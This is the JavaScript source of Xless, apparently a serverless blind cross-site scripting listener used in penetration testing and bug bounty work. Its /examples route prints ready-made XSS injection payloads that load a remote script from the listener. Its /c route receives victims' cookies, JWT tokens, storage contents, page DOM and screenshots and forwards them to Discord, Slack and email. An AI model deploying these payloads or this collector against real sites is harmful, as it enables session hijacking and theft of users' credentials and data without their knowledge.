// Xless: The Serverlesss Blind XSS App.
// Version: v1.3
// Author: Mazin Ahmed <mazin@mazinahmed.net>

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path");
const nodemailer = require("nodemailer");

// Support local development with .env
require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY;
const discord_webhook_url = process.env.DISCORD_WEBHOOK_URL;
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;

// Email Configuration
const email_config = {
  host: process.env.EMAIL_HOST,
  port: process.env.EMAIL_PORT,
  user: process.env.EMAIL_USER,
  pass: process.env.EMAIL_PASS,
  from: process.env.EMAIL_FROM,
  to: process.env.EMAIL_TO
};

const app = express();
app.use(cors());

app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use(function (req, res, next) {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generate_blind_xss_alert(body) {
  var alert = "🚨 **XSSless: Blind XSS Alert** 🚨\n";
  alert += "═══════════════════════════════════\n\n";

  // Priority fields first
  const priorityFields = ['Location', 'Document Domain', 'Document Location', 'Remote IP', 'Cookies', 'JWT Tokens'];
  const processedFields = new Set();

  // Add priority fields first
  priorityFields.forEach(field => {
    if (body[field] !== undefined && !processedFields.has(field)) {
      processedFields.add(field);
      if (field === 'Screenshot' || field === 'Screenshot URL') return;

      let emoji = '📍';
      if (field === 'Cookies') emoji = '🍪';
      if (field === 'JWT Tokens') emoji = '🔑';
      if (field === 'Remote IP') emoji = '🌐';
      if (field === 'Document Domain' || field === 'Document Location') emoji = '📄';

      if (body[field] === "") {
        alert += `${emoji} **${field}:** \`None\`\n\n`;
      } else {
        let value = body[field];
        // Truncate very long values for readability
        if (field === 'DOM' && value.length > 500) {
          value = value.substring(0, 500) + '... [truncated]';
        }
        alert += `${emoji} **${field}:**\n\`\`\`\n${value}\n\`\`\`\n`;
      }
    }
  });

  // Add remaining fields
  for (let k of Object.keys(body)) {
    if (processedFields.has(k) || k === 'Screenshot' || k === 'Screenshot URL') continue;
    processedFields.add(k);

    let emoji = '•';
    if (k === 'User-Agent') emoji = '💻';
    if (k === 'Referrer') emoji = '↩️';
    if (k === 'Origin') emoji = '🏠';
    if (k === 'Browser Time') emoji = '🕐';
    if (k === 'localStorage' || k === 'sessionStorage') emoji = '💾';

    if (body[k] === "") {
      alert += `${emoji} **${k}:** \`None\`\n\n`;
    } else {
      let value = body[k];
      if (k === 'DOM' && value.length > 500) {
        value = value.substring(0, 500) + '... [truncated]';
      }
      alert += `${emoji} **${k}:**\n\`\`\`\n${value}\n\`\`\`\n`;
    }
  }

  return alert;
}

function generate_callback_alert(headers, data, url) {
  var alert = "📡 **XSSless: Out-of-Band Callback Alert** 📡\n";
  alert += "═══════════════════════════════════\n\n";
  alert += `🌐 **Remote IP:** \`${data["Remote IP"]}\`\n`;
  alert += `📍 **Request URI:** \`${url}\`\n`;
  alert += `💻 **User-Agent:** \`${headers["user-agent"] || "Unknown"}\`\n`;
  alert += `🏠 **Host:** \`${headers["host"] || "Unknown"}\`\n\n`;

  alert += "📋 **All Headers:**\n\`\`\`\n";
  for (var key in headers) {
    if (headers.hasOwnProperty(key)) {
      alert += `${key}: ${headers[key]}\n`;
    }
  }
  alert += "\`\`\`\n";
  alert += "\n⏳ *Waiting for payload data collection...*\n";
  return alert;
}

function generate_message_alert(body) {
  var alert = "*XSSless: Message Alert*\n";
  alert += "```\n" + body + "```\n";
  return alert;
}

async function uploadImage(image) {
  // Return new promise
  return new Promise(function (resolve, reject) {
    const options = {
      method: "POST",
      url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
      port: 443,
      headers: {
        "Content-Type": "multipart/form-data",
      },
      formData: {
        image: image,
      },
    };

    // Do async request
    request(options, function (err, imgRes, imgBody) {
      if (err) {
        reject(err);
      } else {
        resolve(imgBody);
      }
    });
  });
}

const splitMessage = (str, maxLength = 2000) => {
  const chunks = [];
  let currentChunk = "";

  const lines = str.split("\n");
  for (const line of lines) {
    if ((currentChunk + line + "\n").length > maxLength) {
      chunks.push(currentChunk);
      currentChunk = "";
    }

    // If a single line is too long (e.g. huge DOM blob), we must split it hard
    if (line.length > maxLength) {
      if (currentChunk.length > 0) {
        chunks.push(currentChunk);
        currentChunk = "";
      }
      let remainingLine = line;
      while (remainingLine.length > 0) {
        let amount = maxLength;
        // Try not to split code blocks awkwardly if possible, but hard split is necessary for huge lines
        chunks.push(remainingLine.slice(0, amount));
        remainingLine = remainingLine.slice(amount);
      }
    } else {
      currentChunk += line + "\n";
    }
  }
  if (currentChunk.length > 0) {
    chunks.push(currentChunk);
  }
  return chunks;
};

// Promisified helper to send Discord alerts
function sendDiscordAlert(message, screenshotUrl) {
  return new Promise((resolve, reject) => {
    if (!discord_webhook_url) {
      return resolve("skipped");
    }

    const chunks = splitMessage(message, 1900);

    let failed = false;
    let completed = 0;
    const totalSteps = screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== ""
      ? chunks.length + 1  // +1 for separate screenshot message
      : chunks.length;

    const checkDone = () => {
      completed++;
      if (completed >= totalSteps) {
        if (failed) reject(new Error("Failed to send some Discord messages"));
        else resolve("sent");
      }
    };

    const sendScreenshot = () => {
      if (!screenshotUrl || screenshotUrl === "NA" || screenshotUrl === "") return;

      // Send screenshot as a SEPARATE message so it reliably renders
      let screenshotPayload = {
        username: "Xless Security Alert",
        content: "📸 **Screenshot:**",
        embeds: [{
          color: 0xff0000,
          image: {
            url: screenshotUrl
          },
          footer: {
            text: "Xless Blind XSS Detection"
          },
          timestamp: new Date().toISOString()
        }]
      };

      request.post(discord_webhook_url, { json: screenshotPayload }, (err, res, body) => {
        if (err || (res && res.statusCode >= 400)) {
          console.error("Error sending screenshot to Discord:", err || `Status: ${res.statusCode}`, body);
          failed = true;
        } else {
          console.log("Discord screenshot message sent successfully");
        }
        checkDone();
      });
    };

    const sendChunk = (index) => {
      if (index >= chunks.length) {
        // All text chunks sent, now send screenshot separately
        setTimeout(sendScreenshot, 500);
        return;
      }

      let payload = {
        username: "Xless Security Alert",
        content: chunks[index]
      };

      request.post(discord_webhook_url, { json: payload }, (err, res, body) => {
        if (err || (res && res.statusCode >= 400)) {
          console.error("Error sending to Discord:", err || `Status: ${res.statusCode}`);
          failed = true;
        }
        checkDone();
        setTimeout(() => sendChunk(index + 1), 500);
      });
    };

    sendChunk(0);
  });
}

// Promisified helper to send Slack alerts
function sendSlackAlert(message, screenshotUrl) {
  return new Promise((resolve, reject) => {
    if (!slack_incoming_webhook) {
      return resolve("skipped");
    }

    let blocks = [
      {
        type: "header",
        text: {
          type: "plain_text",
          text: "🚨 Blind XSS Alert Triggered",
          emoji: true
        }
      },
      {
        type: "section",
        text: {
          type: "mrkdwn",
          text: message
        }
      }
    ];

    // Add screenshot if available
    if (screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== "") {
      blocks.push({
        type: "image",
        title: {
          type: "plain_text",
          text: "📸 Screenshot Captured",
          emoji: true
        },
        image_url: screenshotUrl,
        alt_text: "XSS Screenshot"
      });
    }

    let payload = {
      username: "Xless Security Alert",
      icon_emoji: ":rotating_light:",
      blocks: blocks
    };

    let data = {
      form: {
        payload: JSON.stringify(payload)
      }
    };

    request.post(slack_incoming_webhook, data, (err, res, body) => {
      if (err || (res && res.statusCode >= 400)) {
        console.error("Error sending to Slack:", err || `Status: ${res.statusCode}`);
        reject(err || new Error(`Slack API Status: ${res.statusCode}`));
      } else {
        resolve("sent");
      }
    });
  });
}

// Function to send Email Alert (now primary, not fallback)
async function sendEmailAlert(subject, text, screenshotUrl) {
  if (!email_config.host || !email_config.user || !email_config.pass || !email_config.to) {
    console.log("Email not configured, skipping.");
    return;
  }

  let transporter = nodemailer.createTransport({
    host: email_config.host,
    port: email_config.port || 587,
    secure: false,
    auth: {
      user: email_config.user,
      pass: email_config.pass
    }
  });

  // Build HTML email for better formatting
  let plainText = text.replace(/\*\*/g, '').replace(/```/g, '').replace(/\`/g, '');
  let htmlBody = '<div style="font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; border-radius: 10px;">';
  htmlBody += '<h2 style="color: #ff4444;">🚨 ' + subject + '</h2>';
  htmlBody += '<hr style="border-color: #333;">';
  htmlBody += '<pre style="white-space: pre-wrap; word-wrap: break-word; font-size: 13px;">' + plainText + '</pre>';

  if (screenshotUrl && screenshotUrl !== 'NA' && screenshotUrl !== '') {
    htmlBody += '<hr style="border-color: #333;">';
    htmlBody += '<h3 style="color: #ff6644;">📸 Screenshot</h3>';
    htmlBody += '<a href="' + screenshotUrl + '"><img src="' + screenshotUrl + '" style="max-width: 100%; border-radius: 8px; border: 2px solid #ff4444;" /></a>';
  }
  htmlBody += '<br><p style="color: #888; font-size: 11px;">— Xless Blind XSS Detection</p>';
  htmlBody += '</div>';

  let mailOptions = {
    from: email_config.from || email_config.user,
    to: email_config.to,
    subject: '🚨 ' + subject,
    text: plainText + (screenshotUrl ? '\n\nScreenshot URL: ' + screenshotUrl : ''),
    html: htmlBody
  };

  try {
    let info = await transporter.sendMail(mailOptions);
    console.log("Email sent: %s", info.messageId);
  } catch (error) {
    console.error("Error sending email:", error);
  }
}

// Helper to orchestrate notifications - sends to ALL configured channels
async function sendNotifications(message, screenshotUrl, subject = "Xless Alert") {
  const promises = [];

  // Send to Discord if configured
  if (discord_webhook_url) {
    promises.push(sendDiscordAlert(message, screenshotUrl));
  }

  // Send to Slack if configured
  if (slack_incoming_webhook) {
    promises.push(sendSlackAlert(message, screenshotUrl));
  }

  // Send email ALWAYS if configured (not just as fallback)
  if (email_config.host && email_config.user && email_config.pass && email_config.to) {
    promises.push(sendEmailAlert(subject, message, screenshotUrl));
  }

  if (promises.length === 0) {
    console.log("WARNING: No notification channels configured!");
    return;
  }

  const results = await Promise.allSettled(promises);
  results.forEach((result, i) => {
    if (result.status === 'rejected') {
      console.error(`Notification channel ${i} failed:`, result.reason);
    }
  });
}


app.get("/examples", (req, res) => {
  res.header("Content-Type", "text/plain");
  //var url = req.protocol + '://' + req.headers['host']
  var url = "https://" + req.headers["host"];
  var page = "";
  page += `\'"><script src="${url}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;

  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;

  page += `<script>$.getScript("${url}")</script>`;
  res.send(page);
  res.end();
});

app.all("/message", async (req, res) => {
  var message = req.query.text || req.body.text;
  const alert = generate_message_alert(message);
  var domain = req.headers["host"] || "Unknown";

  // Send Notifications
  await sendNotifications(alert, null, "XLess Message Alert — " + domain);

  res.send("ok\n");
  res.end();
});

app.post("/c", async (req, res) => {
  let data = req.body;

  // Upload our screenshot and only then send the Slack/Discord alert
  data["Screenshot URL"] = "";

  if (imgbb_api_key && data["Screenshot"]) {
    const encoded_screenshot = data["Screenshot"].replace(
      "data:image/png;base64,",
      ""
    );

    try {
      const imgRes = await uploadImage(encoded_screenshot);
      const imgOut = JSON.parse(imgRes);
      if (imgOut.error) {
        data["Screenshot URL"] = "NA";
        console.error("ImgBB error:", imgOut.error);
      } else if (imgOut.data && imgOut.data.url) {
        // Use direct image URL (not url_viewer) so it embeds in Discord/Slack
        data["Screenshot URL"] = imgOut.data.url;
        console.log("Screenshot uploaded:", imgOut.data.url);
      }
    } catch (e) {
      data["Screenshot URL"] = e.message;
    }
  }

  // Now handle the regular alerts
  data["Remote IP"] =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_blind_xss_alert(data);

  // Extract domain for email subject
  var domain = data["Document Domain"] || data["Document Location"] || data["Location"] || "Unknown";
  // If it's a full URL, extract just the hostname
  try { domain = new URL(domain).hostname || domain; } catch (e) { /* keep as-is */ }

  // Send Notifications
  await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain);

  res.send("ok\n");
  res.end();
});

/**
 * Route to check the health of our xless listener
 */
app.get("/health", async (req, res) => {
  let health_data = {};

  // Check if the environemtn variables are set
  health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
  health_data.SLACK_INCOMING_WEBHOOK = slack_incoming_webhook !== undefined;
  health_data.DISCORD_WEBHOOK_URL = discord_webhook_url !== undefined;
  health_data.EMAIL_FALLBACK = (email_config.host && email_config.user && email_config.pass && email_config.to) ? true : false;

  if (!health_data.IMGBB_API_KEY || (!health_data.SLACK_INCOMING_WEBHOOK && !health_data.DISCORD_WEBHOOK_URL && !health_data.EMAIL_FALLBACK)) {
    // Warning if no notification channels
  }

  const xless_logo =
    "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";

  try {
    const imgRes = await uploadImage(xless_logo);
    const imgOut = JSON.parse(imgRes);
    if (imgOut.error) {
      health_data.imgbb_response = imgOut.error;
    } else if (imgOut && imgOut.data && imgOut.data.url_viewer) {
      // Add the URL to our health_data
      health_data.imgbb_response = imgOut.data.url_viewer;
    }
  } catch (e) {
    health_data.imgbb_response = e.message;
  }

  res.json(health_data);
  res.end();
});

app.all("/*", async (req, res) => {
  var headers = req.headers;
  var data = req.body;
  data["Remote IP"] =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const alert = generate_callback_alert(headers, data, req.url);
  var domain = req.headers["host"] || "Unknown";

  // Send Notifications
  await sendNotifications(alert, null, "XLess Callback Alert — " + domain);

  res.sendFile(path.join(__dirname + "/payload.js"));
});

// Export the app for serverless (Netlify/Vercel)
module.exports = app;

// Only start server if not in serverless environment
if (require.main === module) {
  app.listen(port, (err) => {
    if (err) throw err;
    console.log(`> Ready On Server http://localhost:${port}`);
  });
}
